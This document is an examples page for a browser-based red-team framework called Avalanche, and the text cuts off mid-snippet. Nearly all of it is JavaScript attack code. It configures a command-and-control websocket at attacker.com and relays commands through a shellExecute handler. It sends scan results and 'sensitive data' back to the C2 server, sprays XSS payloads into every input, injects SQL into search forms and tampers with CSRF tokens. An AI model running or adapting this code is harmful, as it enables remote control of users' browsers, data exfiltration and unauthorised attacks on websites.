# Avalanche Framework - Advanced Examples

Production-ready examples for common red team operations.

---

## Table of Contents

1. [Basic Setup](#basic-setup)
2. [C2 Communication](#c2-communication)
3. [Automated Scanning](#automated-scanning)
4. [Payload Injection](#payload-injection)
5. [Report Generation](#report-generation)
6. [Multi-Client Operations](#multi-client-operations)
7. [Integrated Workflows](#integrated-workflows)

---

## Basic Setup

### Minimal Configuration

```javascript
import AvalancheFramework from './Integration.js';

const avalanche = new AvalancheFramework();
await avalanche.initialize();
```

### Full Configuration

```javascript
const avalanche = new AvalancheFramework({
  // Command & Control
  commandServerUrl: 'ws://attacker.com:8080',
  autoConnect: true,

  // Client Identity
  clientId: 'target-123',

  // Reporting
  companyName: 'Target Corp',
  assessmentName: 'Security Assessment - Target.com',
  assessor: 'Red Team',

  // Behavior
  verbose: true,
  timeout: 10000
});

await avalanche.initialize();
console.log(avalanche.getStatus());
```

---

## C2 Communication

### Bidirectional Command Execution

```javascript
// Client registers handler
avalanche.commandServer.onCommand('shellExecute', async (payload) => {
  try {
    const result = await fetch(payload.url, {
      method: payload.method || 'GET',
      headers: payload.headers,
      body: payload.body
    }).then(r => r.json());

    return { success: true, result };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

// Server sends command
const result = await client.sendCommand('shellExecute', {
  url: '/api/admin',
  method: 'GET'
}, true);

console.log('Shell result:', result);
```

### Message Routing Between Clients

```javascript
// Client A sends to Client B
avalanche.commandServer.routeMessage('client-b-id', {
  type: 'dataExchange',
  payload: 'sensitive data',
  timestamp: Date.now()
});

// Client B receives
window.addEventListener('commandserver-message', (e) => {
  if (e.detail.type === 'dataExchange') {
    console.log('Received data from client:', e.detail.payload);
  }
});
```

### Broadcast Alert System

```javascript
// Detect threat and broadcast to all clients
window.addEventListener('avalanche-scan-completed', (e) => {
  if (e.detail.summary.criticalIssues > 0) {
    avalanche.commandServer.broadcastMessage({
      alert: 'CRITICAL',
      message: `Critical vulnerabilities detected on ${window.location.host}`,
      issueCount: e.detail.summary.criticalIssues,
      clientId: avalanche.commandServer.config.clientId,
      timestamp: Date.now()
    });
  }
});

// All clients listen for alerts
window.addEventListener('commandserver-broadcast', (e) => {
  if (e.detail.alert === 'CRITICAL') {
    // Take action
    console.warn(`[ALERT] ${e.detail.message}`);
  }
});
```

### Persistent Connection with Heartbeat

```javascript
const avalanche = new AvalancheFramework({
  commandServerUrl: 'ws://c2.attacker.com:8080',
  heartbeatInterval: 15000,      // 15 second heartbeat
  reconnectInterval: 5000,       // Retry every 5 seconds
  maxReconnectAttempts: 10       // Try 10 times
});

await avalanche.initialize();

// Monitor connection status
setInterval(() => {
  const telemetry = avalanche.getTelemetry();
  console.log(`Connected: ${telemetry.connected}`);

  if (telemetry.connected) {
    avalanche.commandServer.sendTelemetry({
      uptime: Math.floor(Date.now() / 1000),
      memory: performance.memory?.usedJSHeapSize,
      active: true
    });
  }
}, 30000);
```

---

## Automated Scanning

### Scheduled Security Scans

```javascript
// Run scan every 5 minutes
setInterval(async () => {
  console.log('[Scan] Starting scheduled assessment...');

  const results = await avalanche.runSecurityAssessment();

  console.log(`[Scan] Found ${results.summary.totalIssues} issues`);
  console.log(`[Scan] Critical: ${results.summary.criticalIssues}`);
  console.log(`[Scan] High: ${results.summary.highIssues}`);

  // Send to C2
  if (avalanche.state.connected) {
    await avalanche.commandServer.sendCommand('logScanResults', results.summary);
  }
}, 5 * 60 * 1000);
```

### Targeted Vulnerability Scanning

```javascript
// Scan only XSS
const xssVulns = await avalanche.pentest.scanXSSVulnerabilities();
console.log(`XSS Issues: ${xssVulns.length}`);

// Scan only CSRF
const csrfVulns = await avalanche.pentest.scanCSRFProtection();
console.log(`CSRF Issues: ${csrfVulns.length}`);

// Scan only Auth
const authVulns = await avalanche.pentest.scanAuthenticationFlaws();
console.log(`Auth Issues: ${authVulns.length}`);

// Combine results
const findings = [
  ...xssVulns,
  ...csrfVulns,
  ...authVulns
];

avalanche.reporting.addFindings(findings);
```

### Dynamic Scan Based on Page Content

```javascript
// Detect page type and run appropriate scans
const pageType = document.body.getAttribute('data-page-type');

const scanConfig = {
  'login': ['auth', 'csrf'],
  'search': ['xss', 'injection'],
  'upload': ['injection', 'csp'],
  'api': ['cors', 'auth', 'injection']
};

const scansToRun = scanConfig[pageType] || ['all'];

for (const scanType of scansToRun) {
  const results = await avalanche.testVulnerability(scanType);
  avalanche.reporting.addFindings(results);
}

avalanche.exportReport('json');
```

### Progressive Scan with Status Updates

```javascript
async function progressiveScan() {
  const scans = [
    { name: 'XSS', fn: () => avalanche.pentest.scanXSSVulnerabilities() },
    { name: 'CSRF', fn: () => avalanche.pentest.scanCSRFProtection() },
    { name: 'Auth', fn: () => avalanche.pentest.scanAuthenticationFlaws() },
    { name: 'Headers', fn: () => avalanche.pentest.analyzeSecurityHeaders() }
  ];

  const allFindings = [];

  for (const scan of scans) {
    console.log(`[Progress] Starting ${scan.name} scan...`);
    const findings = await scan.fn();
    allFindings.push(...findings);

    avalanche.commandServer.sendTelemetry({
      scanPhase: scan.name,
      findingsCount: findings.length,
      progress: `${scans.indexOf(scan) + 1}/${scans.length}`
    });
  }

  return allFindings;
}

const findings = await progressiveScan();
```

---

## Payload Injection

### Spray Payloads Across Page

```javascript
// Get all XSS payloads
const xssPayloads = PayloadTemplates.getAll('XSS');

// Test each payload in all inputs
for (const payload of xssPayloads) {
  const count = PayloadTemplates.injectIntoAllInputs(payload);

  // Monitor for execution
  setTimeout(() => {
    avalanche.commandServer.sendTelemetry({
      payloadTested: payload.substring(0, 50),
      targetCount: count,
      timestamp: Date.now()
    });
  }, 1000);
}
```

### Targeted Payload Injection

```javascript
// Get search input
const searchInput = document.querySelector('input[name="search"]');

if (searchInput) {
  // Test with SQL injection payload
  const sqliPayload = PayloadTemplates.getRandomPayload('INJECTION', 'sqlInjection');
  PayloadTemplates.injectIntoElement(searchInput, sqliPayload);

  // Trigger search
  searchInput.form?.submit();

  // Log attempt
  avalanche.commandServer.sendTelemetry({
    targetElement: 'input[name="search"]',
    payloadType: 'SQLi',
    payload: sqliPayload
  });
}
```

### CSRF Token Bypass Testing

```javascript
// Find all forms
const forms = document.querySelectorAll('form');

forms.forEach((form, idx) => {
  // Get CSRF token
  const tokenInput = form.querySelector('input[name*="csrf"], input[name*="token"]');

  if (tokenInput) {
    // Modify token
    tokenInput.value = 'invalid_token_' + Math.random().toString(36);

    // Prepare CSRF payload
    const csrfPayload = PayloadTemplates.generateCSRFPayload(
      form.action,
      form.method,
      new FormData(form)
    );

    avalanche.commandServer.sendTelemetry({
      form: idx,
      hasCSRFToken: true,
      bypassAttempted: true
    });
  }
});
```

### Incremental Payload Testing

```javascript
// Test payloads with delays
const payloads = PayloadTemplates.getAll('XSS');
const delayMs = 2000; // 2 seconds between tests

for (let i = 0; i < payloads.length; i++) {
  setTimeout(() => {
    PayloadTemplates.injectIntoAllInputs(payloads[i]);

    avalanche.commandServer.sendTelemetry({
